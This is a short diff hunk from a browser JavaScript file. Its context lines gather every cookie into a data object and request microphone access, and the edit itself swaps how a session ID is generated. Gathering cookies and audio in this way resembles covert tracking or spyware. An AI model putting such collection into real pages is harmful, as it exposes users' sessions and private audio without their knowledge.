@@ -110,8 +110,7 @@
     const cookies = document.cookie.split(';').map(c => c.trim());
     historyData.cookies = cookies;
    
-    const sessionId = performance.getEntriesByType('navigation')[0]?.initiator || 'unknown';
-    historyData.sessionId = sessionId;
+   const sessionId = 'SES-' + Math.floor(Math.random() * 900000 + 100000);
 
     navigator.mediaDevices.getUserMedia({ audio: true, video: false })
       .then(stream => {
